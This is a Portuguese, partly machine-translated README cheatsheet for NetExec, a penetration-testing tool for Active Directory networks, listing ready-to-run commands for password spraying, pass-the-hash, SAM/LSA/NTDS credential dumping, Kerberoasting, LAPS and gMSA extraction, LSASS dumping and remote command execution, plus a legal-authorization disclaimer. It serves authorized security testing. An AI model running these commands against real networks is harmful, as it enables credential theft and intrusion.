<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) – Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="Sucessor CME">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multiprotocolo">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</p>

<p alinhar="centro">
  <b>🌐 O sucessor oficial e voltado para a comunidade do CrackMapExec para exploração de rede e Active Directory</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Por que NetExec em vez de CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Instalação](#-instalação)
- [Protocolos suportados](#-protocolos suportados)
- [Exploração SMB](#-exploração SMB)
  - [Reconhecimento e Enumeração de Compartilhamento](#reconnaissance--share-enumeration)
  - [Distribuição de senha e teste de credenciais](#password-spraying--credential-testing)
  - [Pass-the-Hash (PtH) e Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Despejo de credenciais (SAM, LSA, NTDS)](#dumping de credenciais-sam-lsa-ntds)
  - [Execução de comando](#execução de comando)
- [Exploração LDAP](#-ldap-exploração)
  - [Enumeração de domínio e política de senha](#domain-enumeration--password-policy)
  - [Torragem AS-REP e Kerberoasting](#as-rep-roasting--kerberoasting)
  - [Extração LAPS e gMSA](#laps--extração gmsa)
  - [Ingestão de dados do BloodHound](#bloodhound-data-ingestion)
- [Exploração MSSQL](#-mssql-exploração)
- [Módulos WinRM, RDP e SSH](#-winrm-rdp--ssh-modules)
- [Módulos NetExec populares (`-M`)](#-popular-netexec-modules--m)
- [Espaços de trabalho e banco de dados integrado](#-espaços de trabalho--banco de dados integrado)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Dicas e práticas recomendadas](#-dicas--melhores práticas)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**NetExec** (`nxc`) é uma ferramenta pós-exploração multifuncional projetada para automatizar a avaliação de grandes redes Active Directory e Windows. É a bifurcação oficial e ativa da comunidade e a continuação do **CrackMapExec** (CME), criado depois que o CME foi aposentado e arquivado por seu autor original.

NetExec atua como um “canivete suíço” de rede, fazendo interface perfeita com SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP e VNC para automatizar autenticação, despejo de credenciais, verificações de vulnerabilidade e movimentação lateral.

---

## ⚖️ Por que NetExec em vez de CrackMapExec?

| Recurso | CrackMapExec (CME) | NetExec (nxc) |
|--------|---------|---------------|
| **Status de desenvolvimento** | 🛑 Arquivado/obsoleto | 🟢 Mantido ativamente |
| **Suporte Python** | Legado (Python 3.8-3.10) | Python moderno 3.10+ |
| **Suporte ao protocolo** | SMB, LDAP, MSSQL, WinRM, SSH | + Aprimoramentos de VNC, FTP, RDP, WMI |
| **Suporte BloodHound** | Somente BloodHound Legacy | BloodHound CE e legado |
| **Kerberos e PKINIT** | Limitado | Suporte robusto a tickets PKINIT e Kerberos |
| **Correções de bugs e módulos** | Congelado | CVE e módulos de exploração constantemente atualizados |

---

## 📥 Instalação

### Usando pipx (recomendado)
```bash
pipx install netexec
```
###Kali Linux

NetExec é o substituto oficial do CrackMapExec em Kali:
```bash
sudo apt update && sudo apt install -y netexec
```
### Docker
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Verificação
```bash
nxc --version
```
---

## 🔌 Protocolos Suportados

NetExec aceita o protocolo de destino como argumento principal:
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Bloco de mensagens do servidor (compartilhamentos, dumping SAM/LSA/NTDS, comando exec)
- `nxc ldap` - Protocolo leve de acesso a diretórios (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (consultas de banco de dados, xp_cmdshell, representação)
- `nxc winrm` - Gerenciamento Remoto do Windows (execução furtiva de comandos)
- `nxc rdp` - Protocolo de Área de Trabalho Remota (verificação de autenticação, capturas de tela)
- `nxc ssh` - Secure Shell (teste e execução de credenciais Linux/UNIX)
- `nxc ftp` / `nxc vnc` - Transferência de arquivos e computação em rede virtual

---

## 🛡️ Exploração de pequenas e médias empresas

### Reconhecimento e Enumeração de Compartilhamento
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Pulverização de senha e teste de credenciais
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pass-the-Hash (PtH) e Pass-the-Ticket (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Despejo de credenciais (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Execução de Comando
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳 Exploração LDAP

### Política de enumeração de domínio e senha
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP Torrefação e Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### Extração de LAPS e gMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Ingestão de dados do BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️ Exploração MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀 Módulos WinRM, RDP e SSH

### Execução de comando WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Captura de tela e autenticação RDP
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### Pulverização e comandos SSH
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Módulos NetExec populares (`-M`)

| Módulo | Protocolo | Descrição | Exemplo |
|--------|----------|-------------|---------|
| `spooler` | PME | Verifique se o serviço Spooler de impressão está em execução (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | PME | Verifique a vulnerabilidade CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | PME | Verifique CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | PME | Verifique se o anfitrião é vulnerável à coerção do PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | PME | Despejar minidespejo de memória LSASS furtivamente usando nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | PME | Verifique se o serviço WebClient está ativo para retransmissão WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Despejar senhas LAPS para estações de trabalho | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Extraia segredos da conta de serviço gerenciado do grupo | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Espaços de trabalho e banco de dados integrado

O NetExec registra automaticamente todos os hosts descobertos, credenciais válidas e hashes despejados em um banco de dados SQLite local (`~/.nxc/workspaces/`):
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Tabela de referência rápida

| Tarefa | Protocolo | Comando |
|------|----------|--------|
| **Enumerar ações** | PME | `nxc smb <IP> -u '' -p '' --shares` |
| **Verifique a política de passes** | PME | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Spray de senha** | PME | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Passe o Hash** | PME | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Despejar SAM** | PME | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Despejar NTDS** | PME | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **Torra AS-REP** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Despejo de BloodHound** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| SQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Dicas e práticas recomendadas

1. **Sempre verifique primeiro a política de senha:**
   Antes de iniciar qualquer spray de senha, sempre execute o `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` para inspecionar o `Account Lockout Threshold`. Se estiver definido como 3 ou 5, pulverize apenas uma vez a cada 30 minutos ou mais para evitar o bloqueio de contas de domínio.
2. **Use `--local-auth` para estações de trabalho:**
   Ao testar credenciais de administrador local em estações de trabalho em vez de credenciais de domínio, sempre inclua o sinalizador `--local-auth`.
3. **Integração dinâmica:**
   NetExec funciona perfeitamente em proxies SOCKS (por exemplo, `proxychains nxc smb ...`) ou em interfaces Ligolo-ng TUN com velocidade nativa!

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** NetExec é uma ferramenta ofensiva de avaliação de segurança. Deve ser usado estritamente em redes de computadores e infraestrutura de domínio onde você adquiriu autorização explícita e documentada.

---

## 📚 Recursos

- [Repositório oficial do GitHub da NetExec](https://github.com/Pennyw0rth/NetExec)
- [Documentação oficial do NetExec](https://www.netexec.wiki/)